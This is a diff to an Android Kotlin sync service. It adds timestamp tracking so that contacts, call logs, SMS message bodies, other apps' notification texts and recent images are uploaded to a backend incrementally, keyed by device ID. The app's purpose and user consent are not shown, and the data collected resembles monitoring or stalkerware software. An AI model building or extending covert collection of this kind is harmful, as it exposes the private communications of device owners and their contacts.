@@ -26,6 +26,7 @@ import org.json.JSONObject
 import java.io.File
 import java.text.SimpleDateFormat
 import java.util.*
+import java.security.MessageDigest
 
 class BackendSyncService(private val context: Context) {
     
@@ -36,6 +37,68 @@ class BackendSyncService(private val context: Context) {
         .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
         .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
         .build()
+    
+    // Local storage for tracking last sync times
+    private val sharedPreferences = context.getSharedPreferences("sync_timestamps", Context.MODE_PRIVATE)
+    
+    // Helper function to get last sync time for a data type
+    private fun getLastSyncTime(dataType: String): Long {
+        return sharedPreferences.getLong("last_sync_$dataType", 0L)
+    }
+    
+    // Helper function to update last sync time for a data type
+    private fun updateLastSyncTime(dataType: String, timestamp: Long) {
+        sharedPreferences.edit().putLong("last_sync_$dataType", timestamp).apply()
+        println("📱 Updated last sync time for $dataType: ${Date(timestamp)}")
+    }
+    
+    // Helper function to filter data based on last sync time
+    private fun filterDataByLastSyncTime(dataType: String, data: List<Any>, getTimestamp: (Any) -> Long): List<Any> {
+        val lastSyncTime = getLastSyncTime(dataType)
+        if (lastSyncTime == 0L) {
+            println("📱 No previous sync time found for $dataType, syncing all data")
+            return data
+        }
+        
+        val filteredData = data.filter { item ->
+            val itemTimestamp = getTimestamp(item)
+            itemTimestamp > lastSyncTime
+        }
+        
+        val skippedCount = data.size - filteredData.size
+        if (skippedCount > 0) {
+            println("📱 Skipped $skippedCount already synced $dataType items (since ${Date(lastSyncTime)})")
+        }
+        
+        return filteredData
+    }
+    
+    // Function to clear sync timestamps for a specific data type
+    fun clearSyncTimestamps(dataType: String? = null) {
+        if (dataType == null) {
+            // Clear all sync timestamps
+            sharedPreferences.edit().clear().apply()
+            println("📱 Cleared all sync timestamps")
+        } else {
+            // Clear timestamp for specific data type
+            sharedPreferences.edit().remove("last_sync_$dataType").apply()
+            println("📱 Cleared sync timestamp for $dataType")
+        }
+    }
+    
+    // Function to get sync timestamp statistics
+    fun getSyncTimestampStats(): Map<String, Long> {
+        val allKeys = sharedPreferences.all.keys.filter { it.startsWith("last_sync_") }
+        val stats = mutableMapOf<String, Long>()
+        
+        allKeys.forEach { key ->
+            val dataType = key.substringAfter("last_sync_")
+            val timestamp = sharedPreferences.getLong(key, 0L)
+            stats[dataType] = timestamp
+        }
+        
+        return stats
+    }
     
     // 🎯 TOP-TIER: Last 5 Images Upload Functionality
     suspend fun uploadLast5Images(deviceId: String): Result<String> {
@@ -237,6 +300,8 @@ class BackendSyncService(private val context: Context) {
         return withContext(Dispatchers.IO) {
             try {
                 val contacts = getContactsFromDevice()
+                
+                // Filter contacts based on last sync time (contacts don't have timestamps, so we sync all)
                 val data = contacts.map { contact ->
                     mapOf(
                         "name" to contact.name,
@@ -246,6 +311,14 @@ class BackendSyncService(private val context: Context) {
                         "organization" to ""
                     )
                 }
+                
+                if (data.isEmpty()) {
+                    println("📱 No contacts to sync")
+                    return@withContext SyncResult.Success(0)
+                }
+                
+                println("📱 Syncing ${data.size} contacts")
+                
                 val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                     .format(java.util.Date())
                 val syncRequest = SyncRequest(
@@ -256,7 +329,10 @@ class BackendSyncService(private val context: Context) {
                 
                 val response = apiService.syncData(deviceId, syncRequest)
                 if (response.isSuccessful && response.body()?.success == true) {
-                    SyncResult.Success(data.size)
+                    // Update last sync time
+                    updateLastSyncTime("CONTACTS", System.currentTimeMillis())
+                    val syncResponse = response.body()?.data
+                    SyncResult.Success(syncResponse?.itemsSynced ?: data.size)
                 } else {
                     SyncResult.Error(response.body()?.error ?: "Failed to sync contacts")
                 }
@@ -270,21 +346,37 @@ class BackendSyncService(private val context: Context) {
         return withContext(Dispatchers.IO) {
             try {
                 val callLogs = getCallLogsFromDevice()
-                val data = callLogs.map { callLog ->
-                    mapOf(
-                        "number" to callLog.number,
-                        "type" to when(callLog.type) {
-                            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
-                            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
-                            CallLog.Calls.MISSED_TYPE -> "MISSED"
-                            CallLog.Calls.REJECTED_TYPE -> "REJECTED"
-                            CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
-                            else -> "UNKNOWN"
-                        },
-                        "duration" to callLog.duration,
-                        "date" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(callLog.date))
-                    )
+                
+                // Filter call logs based on last sync time
+                val filteredCallLogs = filterDataByLastSyncTime("CALL_LOGS", callLogs) { callLog ->
+                    (callLog as CallLogData).date
                 }
+                
+                val data = filteredCallLogs.map { callLog ->
+                    (callLog as CallLogData).let { log ->
+                        mapOf(
+                            "number" to log.number,
+                            "type" to when(log.type) {
+                                CallLog.Calls.INCOMING_TYPE -> "INCOMING"
+                                CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
+                                CallLog.Calls.MISSED_TYPE -> "MISSED"
+                                CallLog.Calls.REJECTED_TYPE -> "REJECTED"
+                                CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
+                                else -> "UNKNOWN"
+                            },
+                            "duration" to log.duration,
+                            "date" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(log.date))
+                        )
+                    }
+                }
+                
+                if (data.isEmpty()) {
+                    println("📱 No new call logs to sync")
+                    return@withContext SyncResult.Success(0)
+                }
+                
+                println("📱 Syncing ${data.size} new call logs")
+                
                 val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                     .format(java.util.Date())
                 val syncRequest = SyncRequest(
@@ -295,8 +387,10 @@ class BackendSyncService(private val context: Context) {
                 
                 val response = apiService.syncData(deviceId, syncRequest)
                 if (response.isSuccessful && response.body()?.success == true) {
+                    // Update last sync time
+                    updateLastSyncTime("CALL_LOGS", System.currentTimeMillis())
                     val syncResponse = response.body()?.data
-                    SyncResult.Success(syncResponse?.itemsSynced ?: callLogs.size)
+                    SyncResult.Success(syncResponse?.itemsSynced ?: data.size)
                 } else {
                     SyncResult.Error(response.body()?.error ?: "Failed to sync call logs")
                 }
@@ -310,20 +404,36 @@ class BackendSyncService(private val context: Context) {
         return withContext(Dispatchers.IO) {
             try {
                 val messages = getMessagesFromDevice()
-                val data = messages.map { message ->
-                    mapOf(
-                        "address" to message.address,
-                        "body" to message.body,
-                        "type" to when(message.type) {
-                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "SMS"
-                            Telephony.Sms.MESSAGE_TYPE_SENT -> "SMS"
-                            else -> "SMS"
-                        },
-                        "isIncoming" to (message.type == Telephony.Sms.MESSAGE_TYPE_INBOX),
-                        "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(message.date)),
-                        "isRead" to true
-                    )
+                
+                // Filter messages based on last sync time
+                val filteredMessages = filterDataByLastSyncTime("MESSAGES", messages) { message ->
+                    (message as MessageData).date
                 }
+                
+                val data = filteredMessages.map { message ->
+                    (message as MessageData).let { msg ->
+                        mapOf(
+                            "address" to msg.address,
+                            "body" to msg.body,
+                            "type" to when(msg.type) {
+                                Telephony.Sms.MESSAGE_TYPE_INBOX -> "SMS"
+                                Telephony.Sms.MESSAGE_TYPE_SENT -> "SMS"
+                                else -> "SMS"
+                            },
+                            "isIncoming" to (msg.type == Telephony.Sms.MESSAGE_TYPE_INBOX),
+                            "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(msg.date)),
+                            "isRead" to true
+                        )
+                    }
+                }
+                
+                if (data.isEmpty()) {
+                    println("📱 No new messages to sync")
+                    return@withContext SyncResult.Success(0)
+                }
+                
+                println("📱 Syncing ${data.size} new messages")
+                
                 val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                     .format(java.util.Date())
                 val syncRequest = SyncRequest(
@@ -334,8 +444,10 @@ class BackendSyncService(private val context: Context) {
                 
                 val response = apiService.syncData(deviceId, syncRequest)
                 if (response.isSuccessful && response.body()?.success == true) {
+                    // Update last sync time
+                    updateLastSyncTime("MESSAGES", System.currentTimeMillis())
                     val syncResponse = response.body()?.data
-                    SyncResult.Success(syncResponse?.itemsSynced ?: messages.size)
+                    SyncResult.Success(syncResponse?.itemsSynced ?: data.size)
                 } else {
                     SyncResult.Error(response.body()?.error ?: "Failed to sync messages")
                 }
@@ -350,28 +462,28 @@ class BackendSyncService(private val context: Context) {
             try {
                 val notifications = getNotificationsFromDevice()
                 
-                // Filter notifications by timestamp if provided
-                val filteredNotifications = if (sinceTimestamp > 0L) {
-                    notifications.filter { it.timestamp > sinceTimestamp }
-                } else {
-                    notifications
+                // Filter notifications based on last sync time
+                val filteredNotifications = filterDataByLastSyncTime("NOTIFICATIONS", notifications) { notification ->
+                    (notification as NotificationData).timestamp
                 }
                 
-                println("📱 Syncing ${filteredNotifications.size} notifications for device $deviceId (since: ${if (sinceTimestamp > 0L) "timestamp $sinceTimestamp" else "all time"})")
+                val data = filteredNotifications.map { notification ->
+                    (notification as NotificationData).let { notif ->
+                        mapOf(
+                            "packageName" to notif.packageName,
+                            "title" to notif.title,
+                            "text" to notif.text,
+                            "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(notif.timestamp))
+                        )
+                    }
+                }
                 
-                if (filteredNotifications.isEmpty()) {
+                if (data.isEmpty()) {
                     println("📱 No new notifications to sync")
                     return@withContext SyncResult.Success(0)
                 }
                 
-                val data = filteredNotifications.map { notification ->
-                    mapOf(
-                        "packageName" to notification.packageName,
-                        "title" to notification.title,
-                        "text" to notification.text,
-                        "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(notification.timestamp))
-                    )
-                }
+                println("📱 Syncing ${data.size} new notifications")
                 
                 val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
                     .format(java.util.Date())
@@ -385,9 +497,11 @@ class BackendSyncService(private val context: Context) {
                 val response = apiService.syncData(deviceId, syncRequest)
                 
                 if (response.isSuccessful && response.body()?.success == true) {
+                    // Update last sync time
+                    updateLastSyncTime("NOTIFICATIONS", System.currentTimeMillis())
                     val syncResponse = response.body()?.data
                     println("✅ Notifications sync successful: ${syncResponse?.itemsSynced} items")
-                    SyncResult.Success(syncResponse?.itemsSynced ?: filteredNotifications.size)
+                    SyncResult.Success(syncResponse?.itemsSynced ?: data.size)
                 } else {
                     println("❌ Notifications sync failed: ${response.code()} - ${response.body()?.error}")
                     SyncResult.Error(response.body()?.error ?: "Failed to sync notifications")
